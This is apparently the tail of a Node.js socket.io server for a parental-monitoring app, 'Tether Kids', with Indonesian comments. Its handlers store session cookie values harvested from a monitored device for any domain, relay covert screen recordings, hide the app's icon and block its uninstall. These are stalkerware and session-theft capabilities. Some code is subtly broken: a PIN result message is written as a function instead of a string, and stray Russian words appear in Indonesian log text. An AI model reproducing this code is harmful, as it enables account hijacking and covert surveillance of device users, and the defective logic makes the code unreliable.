    // Session cookies from SessionMonitorService
    socket.on('session:cookies', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { domain, cookies, cookieCount, appName } = data || {};
        // cookies is a JSONArray of {domain, cookies, cookieCount, hasActiveSession}
        const db = database.getDb();
        if (cookies && Array.isArray(cookies)) {
          const stmt = db.prepare('INSERT INTO session_cookies (id, user_id, browser, domain, cookie_name, cookie_value) VALUES (?, ?, ?, ?, ?, ?)');
          for (const domainEntry of cookies) {
            const d = domainEntry.domain || domain || 'unknown';
            const cArr = domainEntry.cookies || [];
            for (const c of cArr) {
              stmt.run(uuidv4(), user.userId, appName || 'Web', d, c.name || '', (c.value || '').substring(0, 200));
            }
          }
          stmt.finalize();
        }
        io.to(`family:${user.familyCode}`).emit('session:cookies:data', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
      } catch (e) { console.error('[WS] session:cookies error:', e); }
    });

    // ========== SCREEN RECORDING ==========
    socket.on('screen:recording:start', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId, maxDuration, quality } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('screen:recording:start', {
        maxDuration: maxDuration || 30000, quality: quality || 'medium', requestedBy: user.userId
      });
    });
    socket.on('screen:recording:stop', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('screen:recording:stop', { requestedBy: user.userId });
    });
    socket.on('screen:recording:chunk', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('screen:recording:chunk', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    socket.on('screen:recording:done', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('screen:recording:done', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });

    // ========== REMOTE SHELL (DIHAPUS - butuh root) ==========
    // Server tetap listen untuk backward compatibility, tapi silent drop.
    socket.on('shell:execute', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      console.log(`[WS] ${user.name} tried shell:execute (DISABLED - butuh root)`);
    });
    socket.on('shell:result', (data) => {
      // Silent drop
    });

    // ========== SESSION COOKIES ==========
    socket.on('session:request-cookies', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('session:request-cookies', { requestedBy: user.userId });
    });
    socket.on('session:cookies:data', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('session:cookies:data', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });

    // ========== DEVICE INFO ==========
    socket.on('device:info:request', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('device:info:request', { requestedBy: user.userId });
    });
    socket.on('device:info:data', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('device:info:data', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });
    socket.on('device:info:result', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('device:info:data', { userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString() });
    });

    // ========== RING / NOTIFY ==========
    socket.on('device:ring', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('device:ring', { requestedBy: user.userId, parentName: user.name });
    });
    socket.on('device:ring:stop', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('device:ring:stop', { requestedBy: user.userId });
    });
    socket.on('notify:send', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId, title, body, priority, targetApp } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('notify:send', { title, body, priority, targetApp, requestedBy: user.userId });
    });

    // ========== INSTALL / UNINSTALL / HIDDEN ICON / PIN VERIFY ==========
    // Parent generate PIN for kid
    socket.on('pin:generate', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      try {
        const { targetUserId, ttlSeconds } = data || {};
        if (!targetUserId) return;
        const db = database.getDb();
        // Save PIN request to DB (PIN is generated by client; server stores it temporarily)
        const id = uuidv4();
        // Note: actual PIN comes from `pin:generated` event below. This just logs the request.
        console.log(`[WS] PIN generation requested by ${user.name} for ${targetUserId}`);
        db.run('INSERT INTO remote_commands (id, issued_by, target_user, command, status) VALUES (?, ?, ?, ?, ?)',
          [id, user.userId, targetUserId, 'pin:generate', 'requested']);
      } catch (e) { console.error('[WS] pin:generate error:', e); }
    });

    // Parent actually sends the PIN to kid (kid receives it via pin:generated)
    socket.on('pin:generated', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      try {
        const { targetUserId, pin, ttlSeconds, purpose } = data || {};
        if (!targetUserId || !pin) return;
        // Forward to kid
        io.to(`user:${targetUserId}`).emit('pin:received', {
          pin, ttlSeconds: ttlSeconds || 600,
          purpose: purpose || 'uninstall_block',
          issuedBy: user.userId, parentName: user.name,
          timestamp: new Date().toISOString()
        });
        // Save to DB
        const db = database.getDb();
        db.run('INSERT INTO remote_commands (id, issued_by, target_user, command, status, result) VALUES (?, ?, ?, ?, ?, ?)',
          [uuidv4(), user.userId, targetUserId, 'pin:generated', 'sent', `PIN ${pin} sent for ${purpose || 'uninstall_block'}`]);
        console.log(`[WS] PIN sent: ${user.name} → ${targetUserId} (${purpose})`);
      } catch (e) { console.error('[WS] pin:generated error:', e); }
    });

    // Kid submits PIN for verification
    socket.on('pin:verify', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { pin, actionType, actionTarget, userId, familyCode } = data || {};
        if (!pin) return;
        const db = database.getDb();
        // Find most recent PIN issued by parent to this kid
        db.get(
          `SELECT id, issued_by, result, issued_at FROM remote_commands
           WHERE target_user = ? AND command = 'pin:generated'
           ORDER BY issued_at DESC LIMIT 1`,
          [user.userId],
          (err, row) => {
            if (err) {
              console.error('[WS] pin:verify DB error:', err);
              socket.emit('pin:verified:result', {
                allowed: false, message: 'Server error', actionType, actionTarget
              });
              return;
            }
            if (!row) {
              socket.emit('pin:verified:result', {
                allowed: false, message: 'Tidak ada PIN aktif. Minta orang tua generate PIN baru.',
                actionType, actionTarget
              });
              // Notify parent of attempt
              io.to(`family:${user.familyCode}`).emit('security:alert', {
                type: 'pin_verify_no_pin',
                userId: user.userId, name: user.name,
                actionType, actionTarget,
                severity: 'WARN',
                message: `${user.name} пытался PIN verify tapi tidak ada PIN aktif`
              });
              return;
            }

            // Extract PIN from result field (PIN was saved in result like "PIN 123456 sent for ...")
            const match = (row.result || '').match(/PIN (\d{6})/);
            const validPin = match ? match[1] : null;
            const allowed = validPin === pin;

            // Check TTL (10 min default)
            const issuedAt = new Date(row.issued_at).getTime();
            const now = Date.now();
            const expired = (now - issuedAt) > 10 * 60 * 1000;
            const finalAllowed = allowed && !expired;

            socket.emit('pin:verified:result', {
              allowed: finalAllowed,
              message: ifExpired => ifExpired
                ? 'PIN sudah kadaluarsa. Minta orang tua generate PIN baru.'
                : (finalAllowed ? '✅ PIN benar. Aksi diizinkan.' : '❌ PIN salah. Aksi ditolak.'),
              actionType, actionTarget
            });

            // Audit log
            db.run('INSERT INTO remote_commands (id, issued_by, target_user, command, status, result) VALUES (?, ?, ?, ?, ?, ?)',
              [uuidv4(), user.userId, user.userId, 'pin:verify', finalAllowed ? 'allowed' : 'denied', `attempted ${actionType} on ${actionTarget}`]);

            // Notify parent of result
            io.to(`family:${user.familyCode}`).emit('security:alert', {
              type: finalAllowed ? 'pin_verify_ok' : 'pin_verify_fail',
              userId: user.userId, name: user.name,
              actionType, actionTarget, pinEntered: pin,
              severity: finalAllowed ? 'INFO' : 'WARN',
              message: finalAllowed
                ? `${user.name} berhasil verifikasi PIN untuk ${actionType}`
                : `${user.name} gagal verifikasi PIN untuk ${actionType} (PIN salah/kadaluarsa)`
            });
          }
        );
      } catch (e) {
        console.error('[WS] pin:verify error:', e);
        socket.emit('pin:verified:result', { allowed: false, message: 'Error', actionType, actionTarget });
      }
    });

    // Kid reports package install
    socket.on('package:installed', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { packageName, appName, isSystemApp, isTetherKids } = data || {};
        const severity = isTetherKids ? 'CRITICAL' : 'INFO';
        io.to(`family:${user.familyCode}`).emit('package:event', {
          type: 'installed', userId: user.userId, name: user.name,
          packageName, appName, isSystemApp, isTetherKids, severity,
          message: isTetherKids
            ? `🚨 Tether Kids di-install ulang di ${user.name}!`
            : `📦 ${appName || packageName} baru di-install di ${user.name}`,
          timestamp: new Date().toISOString()
        });
        console.log(`[WS] Package installed: ${packageName} on ${user.name}`);
      } catch (e) { console.error('[WS] package:installed error:', e); }
    });

    // Kid reports package uninstall
    socket.on('package:uninstalled', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { packageName, appName, isSystemApp } = data || {};
        io.to(`family:${user.familyCode}`).emit('package:event', {
          type: 'uninstalled', userId: user.userId, name: user.name,
          packageName, appName, isSystemApp,
          severity: 'WARN',
          message: `🗑️ ${appName || packageName} di-uninstall dari ${user.name}`,
          timestamp: new Date().toISOString()
        });
      } catch (e) { console.error('[WS] package:uninstalled error:', e); }
    });

    // Kid reports app install attempt (before completion)
    socket.on('app:install:attempt', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { action, packageName, severity } = data || {};
        io.to(`family:${user.familyCode}`).emit('package:event', {
          type: 'install_attempt', userId: user.userId, name: user.name,
          action, packageName, severity: severity || 'WARN',
          message: `⚠️ ${user.name} пытался install/uninstall ${packageName} — menunggu verifikasi PIN`,
          requiresPin: true,
          timestamp: new Date().toISOString()
        });
      } catch (e) { console.error('[WS] app:install:attempt error:', e); }
    });

    // Kid reports its own uninstall attempt — CRITICAL alert
    socket.on('tether:uninstall:attempt', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      try {
        const { packageName, severity, message } = data || {};
        io.to(`family:${user.familyCode}`).emit('package:event', {
          type: 'tether_uninstall_attempt', userId: user.userId, name: user.name,
          packageName, severity: 'CRITICAL',
          message: `🚨🚨🚨 TETHER KIDS пытался DI-UNINSTALL dari ${user.name}!`,
          requiresImmediateAction: true,
          timestamp: new Date().toISOString()
        });
        console.error(`[WS] 🚨 Tether Kids uninstall attempt on ${user.name}`);
      } catch (e) { console.error('[WS] tether:uninstall:attempt error:', e); }
    });

    // Kid reports its own update
    socket.on('tether:self:updated', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('package:event', {
        type: 'tether_updated', userId: user.userId, name: user.name,
        message: `ℹ️ Tether Kids di-update di ${user.name} (v${data?.versionName || '?'})`,
        severity: 'INFO', timestamp: new Date().toISOString()
      });
    });

    // Kid reports package update
    socket.on('package:updated', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('package:event', {
        type: 'updated', userId: user.userId, name: user.name,
        packageName: data?.packageName, appName: data?.appName,
        message: `🔄 ${data?.appName || data?.packageName} di-update di ${user.name}`,
        severity: 'INFO', timestamp: new Date().toISOString()
      });
    });

    // Parent requests hide icon on kid device
    socket.on('hide:icon:request', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      try {
        const { targetUserId, action } = data || {};  // action: "hide" or "show"
        if (!targetUserId) return;
        io.to(`user:${targetUserId}`).emit('hide:icon:command', {
          action: action || 'hide',
          issuedBy: user.userId, parentName: user.name,
          timestamp: new Date().toISOString()
        });
        console.log(`[WS] ${user.name} → ${action} icon on ${targetUserId}`);
      } catch (e) { console.error('[WS] hide:icon:request error:', e); }
    });

    // Parent requests block uninstall (Device Owner only)
    socket.on('block:uninstall:request', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      try {
        const { targetUserId, action } = data || {};  // action: "block" or "unblock"
        if (!targetUserId) return;
        io.to(`user:${targetUserId}`).emit('block:uninstall:command', {
          action: action || 'block',
          issuedBy: user.userId, parentName: user.name,
          timestamp: new Date().toISOString()
        });
        console.log(`[WS] ${user.name} → ${action} uninstall on ${targetUserId}`);
      } catch (e) { console.error('[WS] block:uninstall:request error:', e); }
    });

    // Parent requests kid to show PIN entry dialog
    socket.on('pin:required', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      try {
        const { targetUserId, actionType, actionTarget, pin } = data || {};
        if (!targetUserId) return;
        io.to(`user:${targetUserId}`).emit('pin:required', {
          actionType: actionType || 'settings',
          actionTarget: actionTarget || '',
          pin: pin || '',  // kalau parent pre-generate PIN, langsung kirim
          issuedBy: user.userId, parentName: user.name,
          timestamp: new Date().toISOString()
        });
      } catch (e) { console.error('[WS] pin:required error:', e); }
    });
    // CATATAN: Fitur Reboot, Shutdown, Wipe sudah DIHAPUS PERMANEN dari Tether Kids.
    // Server tetap terima emit dari parent tapi reply dengan error supaya parent UI
    // bisa kasih feedback "fitur ini sudah dihapus".
    socket.on('device:reboot', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      console.log(`[WS] ${user.name} tried to reboot (disabled feature)`);
      socket.emit('command:error', { command: 'device:reboot', reason: 'Fitur Reboot sudah dihapus permanen dari Tether' });
    });
    socket.on('device:shutdown', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      console.log(`[WS] ${user.name} tried to shutdown (disabled feature)`);
      socket.emit('command:error', { command: 'device:shutdown', reason: 'Fitur Shutdown sudah dihapus permanen dari Tether' });
    });
    socket.on('device:wipe', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      console.log(`[WS] ${user.name} tried to wipe (disabled feature)`);
      socket.emit('command:error', { command: 'device:wipe', reason: 'Fitur Wipe sudah dihapus permanen dari Tether' });
    });
    socket.on('device:lock', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      // Lock screen masih jalan — pakai ScreenControlService
      io.to(`user:${targetUserId}`).emit('screen:lock', {
        reason: data?.reason || 'Locked by parent',
        lockedBy: user.userId, parentName: user.name,
        timestamp: new Date().toISOString()
      });
    });

    // ========== LOCATION REQUEST (parent asks for fresh location) ==========
    socket.on('location:request', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('location:request', { requestedBy: user.userId });
    });

    // ========== SCREEN-TIME LIMIT REACHED ==========
    socket.on('screen-time:limit-reached', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('screen-time:limit-reached', {
        userId: user.userId, name: user.name, ...data, timestamp: new Date().toISOString()
      });
    });

    // ========== FLASHLIGHT (both directions) ==========
    socket.on('flashlight:on', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('flashlight:on', { requestedBy: user.userId, parentName: user.name });
    });
    socket.on('flashlight:off', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user || user.role !== 'parent') return;
      const { targetUserId } = data || {};
      if (!targetUserId) return;
      io.to(`user:${targetUserId}`).emit('flashlight:off', { requestedBy: user.userId });
    });
    // kid reports flashlight status back
    socket.on('flashlight:status', (data) => {
      const user = onlineUsers.get(socket.id);
      if (!user) return;
      io.to(`family:${user.familyCode}`).emit('flashlight:status', { userId: user.userId, name: user.name, ...data });
    });

    // ========== GENERIC FALLBACK (forward any unhandled event to target) ==========
    // Disabled by default to avoid security issues. If you need a passthrough,
    // use specific named events above.

    // ========== DISCONNECT ==========
    socket.on('disconnect', () => {
      const user = onlineUsers.get(socket.id);
      if (user) {
        console.log(`[WS] ${user.name} (${user.role}) disconnected`);
        io.to(`family:${user.familyCode}`).emit('user:offline', { userId: user.userId, name: user.name, role: user.role });
        // Only remove from userSockets if it's the same socket
        if (userSockets.get(user.userId) === socket.id) {
          userSockets.delete(user.userId);
        }
        onlineUsers.delete(socket.id);
      }
    });
  });

  console.log('[WS] WebSocket handler initialized');
}

module.exports = { initialize, onlineUsers, userSockets };
